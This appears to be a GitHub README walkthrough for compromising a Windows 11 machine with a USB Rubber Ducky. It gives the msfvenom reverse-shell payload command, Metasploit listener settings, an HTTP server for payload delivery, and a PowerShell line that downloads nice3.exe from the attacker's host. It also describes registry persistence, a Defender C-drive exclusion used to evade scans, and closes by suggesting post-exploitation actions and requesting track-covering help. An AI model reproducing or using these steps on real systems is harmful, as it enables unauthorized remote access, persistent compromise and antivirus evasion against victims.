# Windows 11 Ducky PWN

## *** Notice Educational Purposes Only ***

## Description 
For this project I utilized a USB Rubber Ducky from Hak5 and the Kali Linux tools 'msfvenom', 'msfconsole', and 'meterpreter'. Through these tools I deployed a reverse shell, esatblished persistence, 
and cleaned up my suspicous activity. For my attacking machine I used Kali Linux and my victim machine Windows 11 (with all default security enabled). This attack is able to bypass all Windows 11 default security 
features and maintain undetected persetence through the use of modifying the Default User's Windows Registers.

## Video Demo
[![Watch the Demo](screenshot.png)](https://www.youtube.com/watch?v=YOUR_VIDEO_ID)

## Walkthrough

### Requirements
- Windows 11 machine or virtual machine
- Kali Linux machine or virtual machine
- USB Rubber Ducky (any version)
- Interent Connection
- NAT Network if using VM's (Need communication between VMS)
  
### Preparing Kali Machine
#### Generate Payload
- Use 'msfvenom' to genrate our malicous executable
<pre>msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f exe > /home/x/Desktop/nice3.exe</pre>
- LHOST is the IP adderess of our attacking machine that will act as the server to connect back to replace x.x.x.x with you machines IP
- For /home/x/Desktop/nice3.exe replace x with your Kali Linux username eg /home/Meeps-Underflow/Desktop/nice3.exe
- nice3.exe is the name of our reverse shell executable

![image](https://github.com/user-attachments/assets/98c5b8c5-ab47-45e5-9e0e-c21d1d759ca2)

#### Set Up Listener 
- Open Terminal and use 'msfconsole' to start a Metasploit CLI
<pre>msfconsole</pre>
- Pass parameters for our listener
<pre>use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST x.x.x.x
set LPORT 4444
set ExitOnSession false
exploit -j</pre>
- Replace LHOST x.x.x.x with the same IP you used to genrate the payload eg your Kali Machine IP

![image](https://github.com/user-attachments/assets/61c9f16f-d1d8-4629-9d16-55a5eeaef2d5)

#### Set Up HTTP Server 
- On another Terminal we will host a HTTP server on our Kali Machine containing nice3.exe to be downlaoded
- We will use python3 to create this server on port 80
- Make sure to 'cd' into the directory containing nice3.exe, for me it will be in Desktop
<pre>cd Desktop/</pre>
<pre>python3 -m http.server 80</pre>

![image](https://github.com/user-attachments/assets/6106ade6-483d-4833-9248-fda99cec063c)
- If your curiosu what the actual website looks like you can visit 'x.x.x.x:80' where x.x.x.x is your Kali Machines IP

![image](https://github.com/user-attachments/assets/4fe0322c-2ecb-42b0-920a-458d1c29f56f)


### Preparing USB Rubber Ducky
#### Download Repository 
<pre>git clone https://github.com/Meeps-Underflow/Win11_Ducky_PWN.git</pre>
- Verify download should see all contents of my repository on your machine eg win11_ducky_pwn.txt

![image](https://github.com/user-attachments/assets/41f03a31-1c7d-4f81-bc8d-e35bf957e0db)

#### Convert Ducky Script to .bin
- Visit [Hak5 Payload Studio](https://payloadstudio.hak5.org/community/) follow the introduction and when prompted choose USB Rubber Ducky as your device
- Click File -> Open/Import -> Upload File -> Locate your win11_ducky_pwn.txt file -> Upload
- Take a moment to read over code to undersatnd what is happening
- Change line 63 x.x.x.x to Kali Machine IP eg the http server holding nice3.exe
<pre>STRING powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://x.x.x.x/nice3.exe', 'C:\Users\Default\AppData\Roaming\Microsoft\Windows\nice3.exe')"
</pre>
- Generate Payload
- Download inject.bin ** Don't change name **

#### Load USB Rubber Ducky With Payload
- Plug in your USB Rubber Ducky make sure it is not in attack mode
- Open 'Ducky'
- Move inject.bin from 'Downloads' into 'Ducky'

![image](https://github.com/user-attachments/assets/12900457-30d7-4937-8dda-d408e6bd3e3a)
- Safely unmount 'Ducky'

### Attack

#### Boot Up Windows 11
- Start up your fresh Windows 11 Machine
- Ensure all default security features in 'Windows Security' are enabled

![image](https://github.com/user-attachments/assets/24ca4ef9-af40-4bb9-89f8-75cdd84c8e42)

- Ensure all default security features in 'Exploit Protection' are enabled

##### Optional 
- Take a registry snapshot to compare before and after the attack through 'RegShot'

![image](https://github.com/user-attachments/assets/c9d99d6f-f96e-476a-b43c-fbb99117b9e6)

#### Deploying the Duck
- Now that yor Windows Machine is up and running and you have confirmed all the secuirty features you wish to confirm its time to deploy the duck
- Plug in your USB Rubber Ducky into your Windows 11 Machine and sit back and watch
- After execution is complete go back to your Kali Machine and go to the Terminal that has the msf6 session
- You shhoul see that we now have a successful reverse TCP connection with our victim

![image](https://github.com/user-attachments/assets/34d67397-1a26-46dd-8a3f-12d755640302)

- In order to interact with the session do
<pre>sessions -i n</pre>
- Where n is the session id 
- Lets start a shell to see that we truly have access to the victims machine
<pre>shell</pre>
- And run a simple windows cmd command to see whats going on 'ipconfig'

![image](https://github.com/user-attachments/assets/d32db17a-d28e-4af9-839e-c3fa07cfb151)

- Now that we clearly have a reverse shell that is working on the victims machine it is up to you the attacker to do whatever you wish escalate privledges,snoop files, encrypt files, mine crypto...
- You can do this within a meterpreter shell or a windows shell
- After confirming reverse shell we can terminate our http server by going back to the Terminal and inputing Ctrl + c

#### Test Persestence 
- In order to test persestence we will restart our windows VM and see if our listener on our Kali Machine will get another session when the Windows Machine Boots Back up

![image](https://github.com/user-attachments/assets/f0bddd65-b922-48e1-8ba7-0ecc4f7a7fa3)

- After the machine restarts go back to our msf6 session and wait for a new session to appear

![image](https://github.com/user-attachments/assets/8a118ee2-7306-491e-8171-d7c86d8c8cd9)

- As you can see a new session was created from the machine we previusly exploited verifying that our persestence works

#### Test Microsoft Defender Scan
- Lets now test to see if MD quick scan can detect our malware

##### Test 1
- First we will run quick scan without removing our C drive exclusion

![image](https://github.com/user-attachments/assets/bc4072f0-1f59-4356-83ff-1b6171eb1114)

- As you can see nothing was found but it rasied an exception saying how we are excluding the C drive from scans

![image](https://github.com/user-attachments/assets/cc789579-199e-48be-ba83-c845ec55c1e0)

##### Optional RegShot
- If you decided to take a registry snapshot before executing the attack now would be the time to take another shot and compare the two

![image](https://github.com/user-attachments/assets/cbd6c26c-b7f7-47b1-930e-4c723220294b)

- As you can see about at the bottom there the registry modification that involves an "unknown" exe nice3.exe

##### Test 2
- Now lets remove that exclusion on the C drive and run a quick scan again to see if that finds our malware

![image](https://github.com/user-attachments/assets/6f0e3199-9733-4c25-bbb4-a1c863d5fb56)

![image](https://github.com/user-attachments/assets/79d93d3e-1c0f-4f93-88e5-75d5561fc386)

- As you can see after removing the exclusion the scan was able to find our malware
- Lets take action and 'Remove' the malware from our windows system 
- On our Kali Machine in our msf6 session we can see that our connection dies
- Even if we restart the Windows 11 machine it will not get another connection becasue Windows Defender removed the malware entirely

![image](https://github.com/user-attachments/assets/120b8017-dc07-497a-8152-b0eff95d6dca)


### Contributions Welcome
- If anyone would like to contribute or add onto anything that the ducky script does please do so.
- Some ideas I have are revolved around completely covering my history of activity
- Obviosuly I would like to have a seperate machine to act as proxy in between victim - proxy - attacker
- Any other ideas would be awesome thanks

